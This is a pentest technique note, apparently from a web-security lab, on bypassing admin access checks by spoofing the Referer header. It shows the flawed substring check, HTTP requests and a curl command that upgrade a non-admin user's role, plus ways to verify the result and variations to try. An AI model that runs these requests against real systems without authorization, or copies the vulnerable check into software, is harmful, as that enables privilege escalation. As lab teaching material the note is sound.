# Referer-Based Authorization Bypass

## When this applies

- Server checks the `Referer` header to decide if the request was initiated from an authorized page.
- Pattern: action endpoint requires that the request come from `/admin/*` even though `/admin/*` itself isn't accessible by the caller.
- Common in legacy apps where developers tried to bolt access control onto a stateless endpoint.

## Technique

Spoof the `Referer` header on the action request. The server's substring check on the Referer accepts any URL that contains `/admin`.

**Vulnerable Code Logic:**
```python
if '/admin' in request.headers.get('Referer'):
    allow_action()
```

## Steps

Lab — Referer-Based Bypass:
```http
GET /admin-roles?username=wiener&action=upgrade HTTP/1.1
Cookie: [non-admin-session]
Referer: https://[lab].web-security-academy.net/admin
```

Exploitation:
```http
GET /admin-roles?username=wiener&action=upgrade HTTP/1.1
Cookie: [non-admin-session]
Referer: https://target.com/admin
```

Or with curl:
```bash
curl -s "https://target.com/admin-roles?username=wiener&action=upgrade" \
  -H "Cookie: [non-admin-session]" \
  -H "Referer: https://target.com/admin"
```

## Verifying success

- Action takes effect (upgrade succeeds, user state changed) when the Referer is spoofed.
- Without the Referer the same request returns 403 / 302.
- Removing the Referer or pointing it elsewhere reverts to the failure state — confirming the check is on Referer.

## Common pitfalls

- Some apps require the Referer to be `https://target.com/admin` exactly (substring vs equality) — try variations.
- Spoofing must happen via Burp/curl — browsers strip cross-origin Referer values when sent from `https://attacker.com`.
- A Referer of `null` or empty may also bypass if the check is "if Referer doesn't contain /admin".

## Tools

- Burp Suite Repeater
- curl with `-H "Referer:"`
- Browser-side: only via DevTools Network condition or extensions
